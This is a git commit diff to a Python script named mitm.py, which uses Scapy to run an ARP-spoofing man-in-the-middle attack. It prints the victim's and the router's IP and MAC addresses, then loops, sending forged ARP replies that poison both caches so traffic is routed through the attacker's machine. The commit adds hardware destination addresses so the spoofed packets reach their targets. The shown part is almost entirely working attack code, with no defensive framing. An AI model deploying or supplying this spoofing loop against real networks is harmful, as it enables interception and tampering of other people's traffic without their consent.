1138175711aff8ab207763b5f7f5e8174f9da50a
m4ul <hansonlucas06@gmail.com>
2022-11-04 16:22:46 +0100

    l

--- mitm.py
+++ mitm.py
@@ -23,13 +23,14 @@ print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])
 print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
 
 #hwsrc:mac source
+#hwdst: mac dest
 #psrc:ip source
 #pdst:ip dest
 
 try:
     while True:
-        torouter = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[victim-1]), pdst=(ip[router-1])), timeout=3, verbose=0)
-        tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1])), timeout=3, verbose=0)
+        torouter = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[victim-1]), pdst=(ip[router-1]),hwdst=(mac[router-1])), timeout=3, verbose=0)
+        tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
 except KeyboardInterrupt:
     pass
 
